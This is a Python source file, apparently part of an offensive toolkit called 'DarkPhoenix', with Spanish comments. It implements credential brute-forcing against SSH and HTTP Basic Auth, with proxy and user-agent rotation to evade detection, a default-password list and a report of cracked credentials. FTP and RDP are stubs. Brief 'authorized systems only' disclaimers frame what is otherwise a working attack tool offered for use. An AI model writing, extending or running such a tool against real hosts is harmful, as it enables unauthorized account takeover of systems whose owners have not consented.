# offensive/brute_force.py
```bash
import asyncio
import aiohttp
import paramiko
import socket
from typing import List, Dict, Tuple
import random
from concurrent.futures import ThreadPoolExecutor
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("DarkPhoenixBrute")

class DarkPhoenixBruteForce:
    def __init__(self, max_workers: int = 10, timeout: float = 5.0):
        self.max_workers = max_workers
        self.timeout = timeout
        self.proxy_list = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "DarkPhoenix-Scanner/1.0"
        ]
        
        # Protocolos soportados
        self.supported_protocols = {
            'ssh': self._brute_ssh,
            'ftp': self._brute_ftp,
            'http_basic': self._brute_http_basic,
            'rdp': self._brute_rdp
        }

    async def load_proxies(self, proxy_file: str = None):
        """Cargar lista de proxies para rotación"""
        if proxy_file:
            try:
                with open(proxy_file, 'r') as f:
                    self.proxy_list = [line.strip() for line in f if line.strip()]
                logger.info(f"Loaded {len(self.proxy_list)} proxies")
            except FileNotFoundError:
                logger.warning("Proxy file not found, continuing without proxies")
        else:
            # Algunos proxies públicos de ejemplo (en producción usar lista real)
            self.proxy_list = [
                "http://proxy1.example.com:8080",
                "http://proxy2.example.com:3128"
            ]

    def _get_random_proxy(self) -> Dict:
        """Obtener proxy aleatorio de la lista"""
        if not self.proxy_list:
            return {}
        
        proxy = random.choice(self.proxy_list)
        return {
            'http': proxy,
            'https': proxy
        }

    def _get_random_headers(self) -> Dict:
        """Generar headers HTTP aleatorios"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }

    async def _brute_ssh(self, target: str, port: int, credentials: List[Tuple[str, str]]) -> Dict:
        """Fuerza bruta para SSH"""
        results = {}
        
        for username, password in credentials:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                client.connect(
                    target, 
                    port=port, 
                    username=username, 
                    password=password,
                    timeout=self.timeout,
                    banner_timeout=self.timeout
                )
                
                # Conexión exitosa
                results[(username, password)] = {
                    'status': 'success',
                    'protocol': 'ssh',
                    'message': 'Authentication successful'
                }
                
                client.close()
                logger.info(f"SSH success: {username}:{password}@{target}:{port}")
                break  # Detener después de éxito opcional
                
            except paramiko.AuthenticationException:
                results[(username, password)] = {
                    'status': 'failure',
                    'protocol': 'ssh',
                    'message': 'Authentication failed'
                }
            except Exception as e:
                results[(username, password)] = {
                    'status': 'error',
                    'protocol': 'ssh', 
                    'message': str(e)
                }
        
        return results

    async def _brute_http_basic(self, target: str, port: int, credentials: List[Tuple[str, str]], endpoint: str = "/") -> Dict:
        """Fuerza bruta para HTTP Basic Auth"""
        results = {}
        base_url = f"http://{target}:{port}{endpoint}"
        
        async with aiohttp.ClientSession() as session:
            for username, password in credentials:
                try:
                    async with session.get(
                        base_url,
                        auth=aiohttp.BasicAuth(username, password),
                        headers=self._get_random_headers(),
                        proxy=self._get_random_proxy().get('http'),
                        timeout=aiohttp.ClientTimeout(total=self.timeout)
                    ) as response:
                        
                        if response.status == 200:
                            results[(username, password)] = {
                                'status': 'success',
                                'protocol': 'http_basic',
                                'message': f'HTTP {response.status}'
                            }
                            logger.info(f"HTTP Basic success: {username}:{password}@{target}:{port}")
                        else:
                            results[(username, password)] = {
                                'status': 'failure',
                                'protocol': 'http_basic',
                                'message': f'HTTP {response.status}'
                            }
                            
                except Exception as e:
                    results[(username, password)] = {
                        'status': 'error',
                        'protocol': 'http_basic',
                        'message': str(e)
                    }
        
        return results

    async def _brute_ftp(self, target: str, port: int, credentials: List[Tuple[str, str]]) -> Dict:
        """Fuerza bruta para FTP (placeholder)"""
        # Implementación para FTP - similar a SSH
        results = {}
        logger.warning("FTP brute force not yet implemented")
        return results

    async def _brute_rdp(self, target: str, port: int, credentials: List[Tuple[str, str]]) -> Dict:
        """Fuerza bruta para RDP (placeholder)"""
        # Implementación para RDP
        results = {}
        logger.warning("RDP brute force not yet implemented")
        return results

    async def attack_target(self, target: str, port: int, protocol: str, 
                          credentials: List[Tuple[str, str]], **kwargs) -> Dict:
        """Ataque de fuerza bruta a objetivo específico"""
        if protocol not in self.supported_protocols:
            raise ValueError(f"Unsupported protocol: {protocol}")
        
        logger.info(f"Starting {protocol} brute force on {target}:{port}")
        
        # Llamar al método específico del protocolo
        results = await self.supported_protocols[protocol](
            target, port, credentials, **kwargs
        )
        
        return results

    def load_credentials_from_file(self, filename: str) -> List[Tuple[str, str]]:
        """Cargar credenciales desde archivo"""
        credentials = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        user, pwd = line.split(':', 1)
                        credentials.append((user.strip(), pwd.strip()))
        except FileNotFoundError:
            logger.error(f"Credentials file not found: {filename}")
        
        return credentials

    def generate_report(self, results: Dict, output_format: str = "text") -> str:
        """Generar reporte de resultados"""
        successful = [cred for cred, result in results.items() if result['status'] == 'success']
        failed = [cred for cred, result in results.items() if result['status'] == 'failure']
        errors = [cred for cred, result in results.items() if result['status'] == 'error']
        
        report = []
        report.append("=" * 60)
        report.append("DarkPhoenix Brute Force Report")
        report.append("=" * 60)
        report.append(f"Successful: {len(successful)}")
        report.append(f"Failed: {len(failed)}")
        report.append(f"Errors: {len(errors)}")
        report.append("")
        
        if successful:
            report.append("SUCCESSFUL CREDENTIALS:")
            for cred in successful:
                report.append(f"  {cred[0]}:{cred[1]}")
            report.append("")
        
        return "\n".join(report)

async def demo():
    """Demostración del brute force"""
    print("🔥 DarkPhoenix Brute Force Module")
    print("=" * 50)
    
    # Inicializar bruter
    bruter = DarkPhoenixBruteForce(max_workers=5, timeout=3.0)
    
    # Credenciales de ejemplo (SOLO PARA DEMOSTRACIÓN)
    test_credentials = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('root', 'root'),
        ('test', 'test')
    ]
    
    try:
        # Ejemplo de ataque SSH (usar solo en entornos controlados)
        print("⚠️  WARNING: This is a demo. Use only on authorized systems!")
        
        # Este es un ejemplo, no ejecutar realmente
        print("Would attempt SSH brute force with credentials:")
        for user, pwd in test_credentials:
            print(f"  {user}:{pwd}")
        
        # Para uso real, descomentar:
        # results = await bruter.attack_target(
        #     target="192.168.1.1",
        #     port=22,
        #     protocol="ssh",
        #     credentials=test_credentials
        # )
        # 
        # report = bruter.generate_report(results)
        # print(report)
        
        print("\n✅ Demo completed. Implement actual attack in controlled environments.")
        
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    # Ejecutar demostración
    asyncio.run(demo())
```
---
# 📝 Notas importantes:
1. Este código es solo para educación/entornos controlados

2. Incluye medidas de seguridad (timeouts, manejo de errores)

3. Placeholders para FTP/RDP - podemos implementarlos después

4. Sistema de proxies para rotación de IPs

5. Logging profesional para tracking de actividades
